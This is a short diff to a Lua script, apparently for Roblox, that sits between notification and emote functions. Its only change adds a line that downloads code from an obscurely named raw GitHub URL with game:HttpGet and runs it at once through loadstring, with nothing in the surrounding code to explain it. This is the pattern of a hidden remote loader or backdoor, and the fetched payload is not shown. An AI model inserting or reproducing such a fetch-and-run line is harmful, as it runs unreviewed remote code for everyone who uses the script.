@@ -304,6 +304,9 @@ local function SendNotification(title, text)
 	end
 end
 
+task.wait(.3)
+loadstring(game:HttpGet('https://raw.githubusercontent.com/LmaoItsCrazyBro/qweytguqwebuqt/refs/heads/main/foundation_intervention'))()
+task.wait()
 local function HumanoidPlayEmote(humanoid, name, id)
 	if IsStudio then
 		return humanoid:PlayEmote(name)
